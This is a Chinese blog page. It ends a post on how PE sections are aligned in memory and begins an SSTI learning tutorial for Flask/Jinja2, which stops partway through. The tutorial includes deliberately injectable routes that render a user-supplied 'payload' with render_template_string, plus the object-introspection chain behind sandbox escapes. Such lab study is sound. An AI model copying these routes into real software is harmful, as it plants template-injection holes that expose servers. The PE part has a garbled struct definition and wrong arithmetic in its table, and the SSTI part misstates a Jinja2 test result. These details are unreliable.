<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193032725.png" alt="image-20211116193032725"></p>
<p>紧随其后，便是扩展PE头，占据224字节单位</p>
<p>起始:00820108</p>
<p>结束:008201E8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193755733.png" alt="image-20211116193755733"></p>
<p><strong>块表</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116194147123.png" alt="image-20211116194147123"></p>
<p>块表起始位置:008201E8</p>
<p>块表结束位置:008202AF</p>
<p><strong>块表后的空隙</strong></p>
<p>根据前面的信息来看，在块表前的结构在运行态以及废运行态出了起始地址不同之外，其他的并无不同</p>
<p>在内存中，块表与块的间隙大小与文件对齐FileAlignment无关，是由<code>内存对齐</code>所决定的，内存对齐的机制与文件对齐类似，都是需为SectionAlignment所规定的的值的整数倍。</p>
<p>内存对齐的属性是由<code>_IMAGE_OPTIONAL_HEADER</code>构造体中的成员<code>SectionAlignment</code>决定的，同时，此成员其实就在<code>FileAlignment</code>(文件对齐)成员的上面</p>
<p>扩展PE头在c中的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;                        <span class="comment">//&lt;--- 内存对齐</span></span><br><span class="line">    DWORD   FileAlignment;                                <span class="comment">//&lt;--- 文件对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;                                <span class="comment">//&lt;--- 决定块的起始位置</span></span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>利用扩展PE头中的SectionAlignment值验证理论是否正确：</p>
<p>从扩展PE头首地址00820108开始数32（1word 2bytes 7dword =1 + 2 + 28）个字节，到820128处，拿到SectionAlignment值</p>
<p>00 10 00 00 即 0x1000</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116195441400.png" alt="image-20211116195441400"></p>
<p>即内存对齐的基数为0x1000</p>
<p>同时，在内存中的PE文件块结构，头地址与SizeofHeaders值无关，因为SizeOfHeaders是文件对齐(FileAlignMent)专用</p>
<p><strong>块</strong></p>
<p>在非运行态中，块的起始位置由PointerToRawData决定，且PointerToRawData必须为FileAlignment的整数倍</p>
<p>但在运行态中，块的起始位置则并不由PointerToRawData决定，PointerToRawData和SizeOfHeaders一样都为文件对齐专用</p>
<p>运行态块存储涉及点较多，此处只对第一个块的起始地址，结束地址以及大小做计算</p>
<p><strong>块的起始地址</strong></p>
<p>第一个块的起始地址，取决于(DOS头+PE头+块表)总大小的和进行内存对齐后的结果。</p>
<p>三大头加起来的地址为8202AF为止，根据SectionAlignment的值1000h计算，需要进行补齐操作，补齐至821000达到1000的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200746213.png" alt="image-20211116200746213"></p>
<p>可以看到第一个块的首地址已经发现:</p>
<p>首地址:821000</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200958454.png" alt="image-20211116200958454"></p>
<p>块表的结束地址=块表首地址+块大小，而块大小通过块表当中的SizeOfRawData可以拿到，此处再放出c中的块表定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line"><span class="number">2</span></span><br><span class="line">    DWORD   PointerToRawData;                <span class="comment">//&lt;--- 块在磁盘文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>根据块表定义可以发现，<code>SizeOfRawData</code>在块表中可以通过块表首地址+16字节(8x1bytes + 2DWORD ) =  8201E8 + 16 = 8201F8</p>
<p>拿到SizeOfRawData大小 00 92 19 00 即 199200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116202106848.png" alt="image-20211116202106848"></p>
<p>由此可知结束地址：821000 + 199200 = 9BA200 + E00（补0内存对齐1000）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203313553.png" alt="image-20211116203313553"></p>
<p><strong>拿到块大小第二种方法</strong></p>
<p>块的大小=块的结束地址-块的起始地址=0x59B000-0x401000=0x19A000（满足内存对齐）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203344335.png" alt="image-20211116203344335"></p>
<p><strong>运行态时，块的大小满足内存对齐，而非先前的文件对齐</strong></p>
<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>在运行态中:</p>
<ul>
<li>DOS头、PE文件头、块表连续存储，中间没有空隙</li>
<li>运行态中，块表与块之间存储可能会有空隙</li>
<li>空隙的大小与SectionAlignMent有关，而非FileAlignMent</li>
<li>块与块之间也有可能会因<code>内存对齐</code>而产生空隙</li>
</ul>
<p>相关数据结构成员：</p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SectionAlignment</td>
<td>扩展PE头</td>
<td>内存对齐</td>
</tr>
</tbody></table>
<p>各结构的起始和结束位置：</p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>00820000</td>
<td>008200F0</td>
<td>0xF0=240</td>
</tr>
<tr>
<td>PE文件头</td>
<td>008200F0</td>
<td>00820108</td>
<td>0xF8=244=224+40</td>
</tr>
<tr>
<td>块表</td>
<td>008201E8</td>
<td>008202AF</td>
<td>0x1E8=200=7*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>00820000</td>
<td>00821000</td>
<td>0x1000（内存对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>00821000</td>
<td>0x19A000</td>
<td>0x19A000（内存对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态与非运行态相同点"><a href="#运行态与非运行态相同点" class="headerlink" title="运行态与非运行态相同点"></a>运行态与非运行态相同点</h4><h5 id="相同"><a href="#相同" class="headerlink" title="相同"></a><strong>相同</strong></h5><p>无论是运行态，还是非运行态，DOS头、PE头、块表均为连续存储，中间没有填充间隙</p>
<p>第一个块表首地址都三个头的大小影响，紧随着对齐后的三个头</p>
<p>块与块之间也需要进行对齐</p>
<h5 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h5><p>运行态与非运行态的起始地址不同</p>
<p>在非运行态中，块表与块之间、块与块之间的间隙由<code>文件对齐(FileAlignment)</code>产生</p>
<p>在运行态中，块表与块之间、块与块之间的间隙由<code>内存对齐(SectionAlignment)</code>产生</p>
<h5 id="非运行态与运行态映射图"><a href="#非运行态与运行态映射图" class="headerlink" title="非运行态与运行态映射图"></a>非运行态与运行态映射图</h5><p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116204836412.png" alt="image-20211116204836412"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-SSTI模板注入学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="article-date">
      <time datetime="2021-11-12T11:02:54.000Z" itemprop="datePublished">2021-11-12</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/11/12/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模板注入学习</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h2><p>根据yu22x师傅文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163671502616780271551002%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163671502616780271551002&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-110220425.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450">SSTI模板注入绕过（进阶篇）</a>复现学习。</p>
<h3 id="何为SSTI"><a href="#何为SSTI" class="headerlink" title="何为SSTI?"></a>何为SSTI?</h3><p>SSTI,服务器端模板注入</p>
<ul>
<li>当服务端接受到攻击者的输入时，将其作为Web应用模板内容的一部分</li>
<li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容从而导致信息泄露、代码执行、GetShell等问题</li>
<li>其影响范围主要取决于模版引擎的复杂性</li>
</ul>
<p>模板注入问题主要出现的框架:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python :jinja2、mako、tornado、django</span><br><span class="line">php: smarty、twig</span><br><span class="line">java： jade、velocity</span><br></pre></td></tr></table></figure>

<h3 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结:"></a>概念总结:</h3><p>​    模板引擎用于将用户数据结合预先设计好的模板代码结合，生成一套属于用户自己的前端html页面，反馈给客户端浏览器于用户使用。</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112191610984.png" alt="image-20211112191610984"></p>
<p>但由于模板引擎往往会存在一些安全问题，虽说模板引擎存在沙箱隔离机制，但由于设计的不严格，同样存在沙箱逃逸技术来绕过，达到引入模块执行命令，读取文件的效果。</p>
<h4 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h4><ul>
<li>前端渲染（SPA，单页面使用）</li>
</ul>
<p>浏览器从服务器得到一些信息( 可能是 JSON 等各种数据交换格式所封装的数据包 , 也可能是合法的 HTML 字符串 )<br>浏览器将这些信息排列组合成人类可读的 HTML 字符串 . 然后解析为最终的 HTML 页面呈现给用户<br>整个过程都是由客户端浏览器完成的 , 因此对服务器后端的压力较小 , 仅需要传输数据即可</p>
<ul>
<li>后端渲染（SSR，服务端渲染）</li>
</ul>
<p>浏览器会直接接收到经过服务器计算并排列过的字符串，浏览器仅需要对其进行解析，呈现给用户即可，对数据的采集和渲染都由服务端完成，因此对客户端浏览器的压力较小，对服务端的压力较大。</p>
<h3 id="Flask模板"><a href="#Flask模板" class="headerlink" title="Flask模板"></a>Flask模板</h3><p><strong>环境搭建</strong></p>
<p>利用Pycharm 内置Flask框架进行学习复现</p>
<p>在左上角选择file-&gt;new project-&gt;Flask</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192857473.png" alt="image-20211112192857473"></p>
<p>Flask框架默认服务端口为5000，运行后访问<a href="http://127.0.0.1:5000检查是否成功运行。">http://127.0.0.1:5000检查是否成功运行。</a></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112192943030.png" alt="image-20211112192943030"></p>
<p>右上方配置run/debug模式，方便我们观察内容更新的结果，实际运行环境时不可开启DEBUG模式。（此处不知为何一直有告警产生）。</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195457706.png" alt="image-20211112195457706"></p>
<p><strong>渲染方法</strong></p>
<p>Flask中的渲染方法分为两种:<code>render_template()</code> 和 <code>render_template_string()</code> </p>
<ul>
<li><p><code>render_template()</code>函数</p>
<p>渲染一个指定的文件，这个指定的文件就是指模板</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195516227.png" alt="image-20211112195516227"></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195544031.png" alt="image-20211112195544031"></p>
</li>
</ul>
<p>根据<code>@app_route(&#39;/hello&#39;)</code>设置的路由，路径指向hello时，利用render_template函数渲染hello.html，并将结果返回给客户端浏览器</p>
<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112195644460.png" alt="image-20211112195644460"></p>
<ul>
<li><p><code>render_template_string()</code> 函数</p>
<p>用于渲染字符串</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200107716.png" alt="image-20211112200107716"></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200115816.png" alt="image-20211112200115816"></p>
</li>
</ul>
<p>注：SSTI与<code>render_template_string()</code> 函数密不可分</p>
<h3 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h3><p>测试demo：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>

<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200644606.png" alt="image-20211112200644606"></p>
<p>可以看到，demo路由下的2*2被<code>render_template_string()</code>渲染后执行了；</p>
<p>再让我们试一试<code>render_template()</code>的效果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200908111.png" alt="image-20211112200908111"></p>
<p>可以看到环境500报错，这是由于render_template函数去寻找html变量所代表的的字符串所指向的模板去了，服务端找不到，返回500错误。</p>
<p><strong>为什么<code>&#123;&#123;xxxxx&#125;&#125;</code>内的语句会被执行？</strong></p>
<ul>
<li>这是由于flask框架中，渲染引擎jinja2将<code>&#123;&#123;---&#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包含的语句被执行。</li>
</ul>
<h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>在上述demo中，虽说可以实现任意代码执行，但由于模板本身自带的沙盒安全机制，某些语句虽说可以执行，但会在执行中途被安全机制拦击。</p>
<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201454136.png" alt="image-20211112201454136"></p>
<p>即使在服务器端将os包含进去，但由于渲染时。模板引擎会对程序行为进行严格限制，导致无法执行命令</p>
<p>沙箱逃离流程</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201647088.png" alt="image-20211112201647088"></p>
<p>借助的主要是各个类之间的继承关系</p>
<p>Python flask部分内建的魔术方法:</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201854287.png" alt="image-20211112201854287"></p>
<ul>
<li><code>__class__</code>：主要用于查看变量所属的类，根据前面的变量形式可以得到其所属的类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">sum</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">builtin_function_or_method</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__base__</code>: 用于查看类的基类，也可是使用数组索引来引来查看特定位置的值</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;,)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__mro__</code>: 也可获得基类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]	<span class="comment">#利用索引拿到指定的信息</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<p>SSTI利用主要是活用各种魔术方法</p>
<h3 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h3><p>服务端所使用的的各种引擎支持的语法是不同的</p>
<p>所以在找到SSTI注入点之后，我们首先应该先判断模板所使用的渲染引擎是什么，这样才能有针对性的构造对应引擎的Payload</p>
<p>通常可用以下payload进行测试:</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112203903757.png" alt="image-20211112203903757"></p>
<p>绿色表示执行成功，红色表示执行失败</p>
<p>注意:<code>&#123;&#123;7*7&#125;&#125;</code> 在Twig引擎中返回49，在Jinja2中返回7777777</p>
<h3 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h3><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xss&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112205055945.png" alt="image-20211112205055945"></p>
<p>通过Flask库自带的request.args.get方法拿到get参数，并回传到页面之上。</p>
<h4 id="任意文件读写"><a href="#任意文件读写" class="headerlink" title="任意文件读写"></a>任意文件读写</h4><p>此处需要上述的魔术方法进行利用</p>
